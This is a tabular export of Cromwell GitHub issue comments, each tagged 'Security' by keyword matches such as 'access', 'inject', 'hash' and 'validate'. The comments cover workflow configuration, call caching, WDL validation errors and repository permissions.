Security,"@TMiguelT @geoffjentry I've been following the conversation and we're pretty keen to use some container system with Cromwell on our cluster. At the moment I'm trying to use udocker with Cromwell with the following conf, but the docker param [is looked up](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/#Docker+Tags) and injected as a [digest](https://docs.docker.com/engine/reference/commandline/pull/#pull-an-image-by-digest-immutable-identifier) which udocker [doesn't appear to support](https://github.com/indigo-dc/udocker/issues/112). . ```; backend {; default: udocker; providers: {; udocker {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {. # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """""". # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; udocker run \; --rm -i \; ${""--user "" + docker_user} \; # Edit: future Michael here, entrypoint in udocker starts interactive shell so exclude it; #--entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """"""; }; }; }; }; ```. which results in the script.submit:; ```bash; udocker run \; --rm -i \; # --entrypoint /bin/bash \ # Edit: Don't include this line it causes interactive shell; -v /path/to/call-untar:/cromwell-executions/path/to/call-untar \; ubuntu@sha256:868fd30a0e47b8d8ac485df174795b5e2fe8a6c8f056cc707b232d65b8a1ab68 \; /cromwell-executions/path/to/call-untar/execution/script; ```. and fails with the error:; ```; Error: invalid repo name syntax; Error: must specify image:tag or repository/image:tag; ```. I can't find some way to disable the docker lookup by Cromwell, nor some non-digest runtime variable that Cromwell exposes. Just wondering how you're achieving this on docker or singularity. . Edit: `entrypoint` in udocker starts interactive shell, suspending the execution of the program.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364:346,inject,injected,346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364,2,"['expose', 'inject']","['exposes', 'injected']"
Security,@aednichols I could give you access to the caas-collections!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-437482357:29,access,access,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4117#issuecomment-437482357,1,['access'],['access']
Security,"@aednichols I want to reopen, because Map[String, MyStruct] also crashes and because if you claim it is about types than the error should appear when I validate with latest womtool and not in a runtime!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4555#issuecomment-464240925:152,validat,validate,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4555#issuecomment-464240925,1,['validat'],['validate']
Security,"@aednichols Thanks again for allowing me push access to the repo. I can not test all the backends manually so it is good that I can access the CI environment and see if the bug fix turned out well. What is the formal process of getting this bug under the Cromwell team's attention? I have made a JIRA issue. Should I put it on the sprint? I also ask this for #5456 which is a really simple fix. I am not in great haste getting a review, but I want to ensure these fixes end up in the next release of Cromwell. These bugs are now actively blocking BioWDL development as our CI always uses a mainline version of Cromwell. (Usually the latest, but we are already actively excluding 49 because of the relative outputs bug). . By no means I want to push the Cromwell team in reviewing these fixes right now, but if you could give me some procedure that would make sure these are reviewed before the next release is out, that would give me some peace of mind. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-611900735:46,access,access,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-611900735,4,['access'],['access']
Security,"@aednichols When I tried creating a branch in broadinstitute/cromwell as suggested by you in #5807, I get . > fatal: Authentication failed for 'https://github.com/broadinstitute/cromwell.git/' . I did _git push mainRepo EFS-fixes-for-5468_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760530070:117,Authenticat,Authentication,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760530070,1,['Authenticat'],['Authentication']
Security,@aednichols Would you be able to merge? I do not have write access. Thanks for any help!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6993#issuecomment-1412302194:60,access,access,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6993#issuecomment-1412302194,1,['access'],['access']
Security,"@aednichols thanks for a detailed look into this. With the latest dev branch, and with the commit that contains the fix, I'm getting the below error. I can still run unpacked without error. ```; (p3) [jeremiah@localhost fail_cromwell]$ /usr/lib/jvm/java-11-openjdk/bin/java -Dconfig.file=/home/jeremiah/code/fresh/really/cromwell/cromwell.example.backends/cromwell.examples.conf --illegal-access=warn -jar /home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar run test_wf_pack.cwl --inputs test_wf.json --type CWL --type-version v1.0; [2019-04-18 17:19:09,95] [info] Running with database db.url = jdbc:hsqldb:mem:39c64473-526e-47d6-a015-f9193a0fd4f4;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:17,77] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-04-18 17:19:17,78] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:389,access,access,389,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"@aednichols you probably misunderstood my issue that you closed. It was not about having a mixed map, but about Cromwell coercing well defined the types to Map[String, Any] at runtime while everything is validated by both Cromwell and womtool at compiletime.; I opened another issue, where the same problem emerges with the struct, where Cromwell tries to consider struct output as Map[String, Any] at runtime. https://github.com/broadinstitute/cromwell/issues/4663",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4661#issuecomment-464247842:204,validat,validated,204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4661#issuecomment-464247842,1,['validat'],['validated']
Security,"@aednichols, rewrote using the ""dependency injection pattern"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-511603946:43,inject,injection,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-511603946,1,['inject'],['injection']
Security,"@anton-khodak commented on [Wed Jan 25 2017](https://github.com/broadinstitute/wdltool/issues/22). I use `wdltool` to parse descriptions from the main repository, for instance, [this one](https://github.com/broadinstitute/wdl/blob/develop/scripts/broad_dsde_workflows/ValidateBamsWf_170107.wdl) and [this](https://github.com/broadinstitute/wdl/blob/develop/scripts/broad_dsde_workflows/ConvertPairedFastQToUnmappedBamWf_170107.wdl) . Both descriptions have valid syntax (`validate` and `parse` run smoothly). However, when I run `highlight` on either of them, I get the following error:; ``` ; $ java -jar ~/Downloads/wdltool-0.8.jar highlight ""/media/anton/ECFA959BFA95631E/Programming/wdl2cwl/ValidateBamsWf_170107.wdl"" console. Exception in thread ""main"" scala.MatchError: [Declaration type=Array[File] name=validation_reports expr=Some(ValidateBAM.validation_report)] (of class wdl4s.WorkflowOutput); at wdl4s.formatter.SyntaxFormatter.wdl4s$formatter$SyntaxFormatter$$formatScope(SyntaxFormatter.scala:188); at wdl4s.formatter.SyntaxFormatter$$anonfun$4.applyOrElse(SyntaxFormatter.scala:153); at wdl4s.formatter.SyntaxFormatter$$anonfun$4.applyOrElse(SyntaxFormatter.scala:153); at scala.PartialFunction$$anonfun$runWith$1.apply(PartialFunction.scala:141); at scala.PartialFunction$$anonfun$runWith$1.apply(PartialFunction.scala:140); at scala.collection.Iterator$class.foreach(Iterator.scala:893); at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); at scala.collection.AbstractIterable.foreach(Iterable.scala:54); at scala.collection.TraversableLike$class.collect(TraversableLike.scala:271); at scala.collection.AbstractTraversable.collect(Traversable.scala:104); at wdl4s.formatter.SyntaxFormatter.wdl4s$formatter$SyntaxFormatter$$formatWorkflow(SyntaxFormatter.scala:153); at wdl4s.formatter.SyntaxFormatter$$anonfun$2.applyOrElse(SyntaxFormatter.scala:73); at wdl4s.formatter.SyntaxFormatter$$anonfun$2.a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2878:472,validat,validate,472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2878,2,"['Validat', 'validat']","['ValidateBAM', 'validate']"
Security,"@antonkulaga @cjllanwarne ; I have tested call-caching with hardlinks and cached-copy strategy. For hashing-strategy I used path+modtime. These were the results for the call-caching:. **It works!**. So this part of the docs should be updated indeed. I have no idea why it works though, so I am a bit hesitant to add it to the docs. @cjllanwarne Do you know if anything changed in the code base that made the call-caching work for hard links?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831:100,hash,hashing-strategy,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831,1,['hash'],['hashing-strategy']
Security,"@antonkulaga Cromwell has [filesystem option](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options) `fingerprint` to hash without having to read the whole file. It is supported by the HPC community, and not by the Cromwell team. Haven't tried it myself, but I wonder whether it would solve your problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967:144,hash,hash,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967,1,['hash'],['hash']
Security,"@antonkulaga It appears that changing the `name` only changes the filename of the output produced by your task, but not the actual processing. So I bet if you look at the files produced by the diamond blast task for all 3 workflows you'll see that even though their names differ they have the same content.; Cromwell by default only cares about the content of a file with respect to call caching and its name is ignored. In this case it likely md5ed the files and found they had the same hash so the copy task was cached.; I'll wait for you to confirm that the output files have indeed the same hash before closing this:. ```; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/ab101af5-26ba-45c8-b592-fb37e06a523d/call-diamond_blast/execution/graywhale_in_human_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/3d75657d-7dc9-4b6f-bbc8-ae579a3fa773/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/276d6f9e-15b1-4dc3-a8a7-889414406511/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; ```. should all produce the same hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450:488,hash,hash,488,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450,3,['hash'],['hash']
Security,"@antonkulaga commented on [Thu Feb 16 2017](https://github.com/broadinstitute/wdl4s/issues/86). If there will be ScalaJS support, then it will be possible to do things like validation of wdl4s directly in the browser. ---. @geoffjentry commented on [Thu Feb 16 2017](https://github.com/broadinstitute/wdl4s/issues/86#issuecomment-280335418). that's an interesting point. My take is that I have nothing against doing it, for me personally it'd likely involve flipping the switch and if it Just Works great and if not (IIRC scala.js isn't 100% source compatible?) I'm not going to go much further. . I mean this in a non-snarky way but this is really going to be in a ""patches welcome"" territory as I doubt it'll be officially prioritized and while I just added it to my ""it'd be a good thing to do"" mental todo list it's not the top item and I don't pop things off that list as frequently as I'd prefer.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2693:173,validat,validation,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2693,1,['validat'],['validation']
Security,"@ccarrizo A call wraps a single command line and thus can only be run on a single backend, correct? Composed backends wouldn't apply for a call. We have a need to be able to report back certain backend specific values and from an operational/regulatory perspective we need to track other things for provenance and such. That information needs to be persisted somewhere - should the backends know about the DB (let's ignore for them oment that one backend does indeed talk directly to the DB)? If not that implies now need to know about the internal persistence. What if we decide to bulkhead all DB access behind a specialized actor/router? You can point to separating out the persistence but that's far beyond the scope of this work and is a separate block entirely. I viewed this as a transitional PR. There'd been a request from team members on our side for a while now that things be done as bit by bit as possible. To do that implies not having full & sweeping changes as the only way to do _that_ is one monolithic PR which causes a ton of problems. The whole process would be a bit smoother if you all could find other portions which could be folded directly into develop _now_ which started to move the ball in the right direction instead of requiring that everything be perfect in one fell swoop.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182388303:599,access,access,599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/427#issuecomment-182388303,1,['access'],['access']
Security,"@cjllanwarne - Here goes... This works:; ```; workflow wf {; call tsk {; input: foo=""Hello"", bar=""World""; }; }; task tsk {; String foo; String? bar; command {; echo ""${foo} ${""here comes bar"" + bar}""; }; }; ```; This doesn't:; ```; workflow wf {; call tsk {; input: foo=""Hello""; }; }; task tsk {; String foo; String? bar; command {; echo ""${foo} ${""here comes bar"" + bar}""; }; }; ```. When `bar` is left out, job stays in the running state, and exceptions are continually thrown in the server logs.; The wdl validates fine.; Thanks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1830#issuecomment-272077981:508,validat,validates,508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1830#issuecomment-272077981,1,['validat'],['validates']
Security,"@cjllanwarne . I have checked out the path+modtime strategy and it is not fundamentally different from the path strategy. That means that it should also work for the path strategy. I wonder why the documentation states otherwise. @cpavanrun @illusional I know you are wondering whether these hashing-strategies work. So hereby I alert you to the fact that they work, it is just not in the documentation yet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513141626:292,hash,hashing-strategies,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513141626,1,['hash'],['hashing-strategies']
Security,"@cjllanwarne :. > Everything has access to the ServiceRegistry. This premise still holds. Why do you think otherwise?. > Anyone (including the Engine) can send a MetadataPut message to the ServiceRegistry, which will forward it automagically to the MetadataService. This is how the magic is currently happening as well. The engine _is_ sending MetadataPut messages to the ServiceRegistry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219110124:33,access,access,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/829#issuecomment-219110124,1,['access'],['access']
Security,"@cjllanwarne ; Are you saying that Cromwell is going to determine if the input file is reference file by checking each input file against the manifest file? This is not how I imagined it. I thought manifest file with checksums is only needed to verify file's up-to-dateness. I imagined it work this way: when user creates a WDL and specifies input files for the workflow, they would look like `gs://gcp-public-data--broad-references/some/path/reference_file.txt`. Cromwell will see this path and think ""ok, this file is a reference file, since it's located in this special bucket, so I will mount a references disk to `/mnt/refdisk` and check for this file in the `/mnt/refdisk/some/path/reference_file.txt` location, but before going on and doing that I'll verify that checksum of that file in GCS matches the one in manifest file"".; I mean bucket name seems redundant in this case, since it's the same for all reference files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517:217,checksum,checksums,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517,2,['checksum'],"['checksum', 'checksums']"
Security,"@cjllanwarne @scottfrazer Note that I removed the deprecation notice from validate. While the current form wouldn't be long for this world we know that it'll reappear w/ slightly different functionality. Instead of removing it and re-adding the endpoint IMO we might as well leave it here (e.g. in the future it wouldn't be a wdl validation but just a workflow validation - whether that be wdl, cwl, etc - in the context of that cromwell jar)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/402#issuecomment-174547479:74,validat,validate,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/402#issuecomment-174547479,3,['validat'],"['validate', 'validation']"
Security,"@cjllanwarne Checkout out #199, a PR into this PR. It refactors `DataAccess`, `Backend`, and `BackendType` around a bit such that the high level workflow manager actor can pass in its data access instance to the backend, OR the various test suites can keep using separate data access instances. . The problem with ""data_access_singleton"" is that the singleton data access seemingly cannot handle the onslaught of our multi-threaded tests. One of our many thread pools around the database seemed to then start returning uncaught(?) errors. Definitely showed some warts in our non-existent load testing... Take a look, decide what you want to keep or jettison, but I do believe that a new database pool / data access should **NOT** be created for each JES `Run`. Otherwise, this branch looks good to go for merge. :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894:189,access,access,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894,4,['access'],['access']
Security,"@cjllanwarne Do you need a red review on this ? If so could you elaborate just a little on what ; > Allows reading of WDL 1.0 and 1.1 Asts through a shared set of CheckedAtoB functions, with the flexibility to inject different transform behavior into each usage of the instantiations of the transforms. means for me poor mortal and / or point to relevant code that I should look at ? 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3852#issuecomment-402194081:210,inject,inject,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3852#issuecomment-402194081,1,['inject'],['inject']
Security,@cjllanwarne I do think the existing test suite should validate this sufficiently apart from the issues raised in the separate Google Doc regarding retries and the probabilities of failure with transferring multiple files.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5141#issuecomment-524990707:55,validat,validate,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5141#issuecomment-524990707,1,['validat'],['validate']
Security,"@cjllanwarne I have had a look bit it is quite non-trivial to find how to evaluate paths at the womValueInputs stage, as cromwell has no knowledge of the backend at this point. This ""relative path"" business only makes sense for the sfsBackend which handles access to local systems. For cloud systems relative paths make no sense at all. ; Evaluating it at the JobPreparationActor is the correct spot, although the implementation ends up to be a bit messy :confused: .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618941883:257,access,access,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618941883,1,['access'],['access']
Security,"@cjllanwarne I'm probably misreading the convo but I was reading this to imply that a cromwell-singleton data access object would be getting hit harder from running our unit tests in terms of connections than real life, but in the latter we could conceivably have many thousands of workflows (and thus many, many thousands of tasks) banging on the DB simultaneously. A teensy threadpool isn't going to be able to handle the latter case. Another possibility (which we originally looked at but discarded for non-singleton data access) is to have an actual data access actor, and then that actor can scale horizontally as needed via a router actor. those actors can even be on different machines if CPU load is an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225:110,access,access,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225,3,['access'],['access']
Security,"@cjllanwarne I've lost write access to the Cromwell repo, so I'm unable to resolve the conflicts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-933942034:29,access,access,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-933942034,1,['access'],['access']
Security,"@cjllanwarne Not sure if this is related (tell me if I should file another issue), but all jobs should be cache hits. Yet, I can see that it is running jobs. This may be due to the ""path"" hashing strategy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703:188,hash,hashing,188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703,1,['hash'],['hashing']
Security,"@cjllanwarne Right, but what I meant was that I'm not sure ""give me a diagram of workflow timings"" is really something which should be served up at all by Cromwell. Rather give access to the data and let something else figure out what they want to do with it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/266#issuecomment-153117050:177,access,access,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/266#issuecomment-153117050,1,['access'],['access']
Security,"@cjllanwarne Scattering over a map does not work with Cromwell-37. The workflow below doesn't pass wom validation. ```wdl; version 1.0. task add {; input {; Int a; Int b; }; command {}; output {; Int result = a + b; }; }. workflow dict2 {; Map[Int, Float] mIF = {1: 1.2, 10: 113.0}. scatter (p in mIF) {; call add {; input: a=p.left, b=5; }; }. output {; Array[String] result = add.result; }; }; ```. ```bash; $ java -jar womtool-37.jar validate dict2.wdl. Failed to process workflow definition 'dict2' (reason 1 of 1): Invalid type for scatter variable 'p': Map[Int, Float]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3408#issuecomment-463889255:103,validat,validation,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3408#issuecomment-463889255,2,['validat'],"['validate', 'validation']"
Security,"@cjllanwarne Thanks for fixing this so fast. For validation I just skip version 32 ;) When is 33 planned?. We want to upgrade to wdl 1.0 anyway but first need to complete our testing framework around wdl, see also https://github.com/biopet/biowdl-test-utils (library) and https://github.com/biowdl/QC (real pipeline with testing)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-398279541:49,validat,validation,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762#issuecomment-398279541,1,['validat'],['validation']
Security,"@cjllanwarne Thanks so much for your response. I am unfortunately getting a new error. Which is as follows:; ```; [2020-08-24 15:28:47,48] [error] 'nioPath' not implemented for SraPath; java.lang.UnsupportedOperationException: 'nioPath' not implemented for SraPath; 	at cromwell.filesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundRec",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:591,hash,hashCode,591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,5,['hash'],"['hashCode', 'hashing']"
Security,"@cjllanwarne The ""causedBy"" nested thing is weird. I'm also not sure how many different formats there are. There's the ""message""; ```; ""failures"": [{; ""message"": ""Task c386672d-0248-4968-9b1a-114f5f5c4706:echo_files failed: error code 5. Message: 8: Failed to pull image ubuntu:latest: \""docker --config /tmp/.docker/ pull ubuntu:latest\"" failed: exit status 1: Pulling repository docker.io/library/ubuntu\nNetwork timed out while trying to connect to https://index.docker.io/v1/repositories/library/ubuntu/images. You may want to check your internet connection or if you are behind a proxy.\n""; }]; ```; and then there's the ""failure"" and timestamp"" :; ```; ""failures"": [{; ""timestamp"": ""2016-08-01T19:58:04.704000Z"",; ""failure"": ""com.google.api.client.googleapis.json.GoogleJsonResponseException: 400 Bad Request\n{\n \""code\"" : 400,\n \""errors\"" : [ {\n \""domain\"" : \""global\"",\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""reason\"" : \""badRequest\""\n } ],\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""status\"" : \""INVALID_ARGUMENT\""\n}""; }],; ```; and then the caused by: ; ```; ""failures"": [{; ""causedBy"": {; ""causedBy"": {; ""message"": ""connect timed out""; },; ""message"": ""Error getting access token for service account: ""; },; ""message"": ""Failed to upload authentication file""; }]; ```. So, if there are these 3 different ways to show the failures section, I'm not sure if there are more formats that I missed in my cursory examination. My dream is that there would be a consistent format for the failures section that we could reliably programmatically find and display.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282802064:1427,access,access,1427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282802064,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"@cjllanwarne The commit hash was 519708d9cafd4c4886d089f3cdf545879d81812c; I ran it in run mode, something along the lines of this: `java -jar ~/Desktop/cromwell-35-SNAPSHOT.jar run test2.wdl` (jar name not exact)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411175536:24,hash,hash,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3986#issuecomment-411175536,1,['hash'],['hash']
Security,"@cjllanwarne The problem with not injecting, and creating separate tasks, is that you either have to clone the entire repo again for each of the tasks to extract the version information etc.., or clone it once and pass around the execution dir of the corresponding task which is even more horrible IMO.; Unless there's another way I'm missing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-286472793:34,inject,injecting,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-286472793,1,['inject'],['injecting']
Security,"@cjllanwarne Unfortunately it looks like this is a separate issue. I tried running it with the file-path hashing method: When I ran it with a wide scatter (312) it hangs before it starts any tasks in the scatter. When I ran it with a small scatter (6) it ""starts"" the jobs inside the scatter but the timing diagram just says `QueuedInCromwell` for all of them. It might not be the fact that there are declarations inside of the scatter, but the fact that those declarations include declaring multiple files, which all happen at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222:105,hash,hashing,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222,1,['hash'],['hashing']
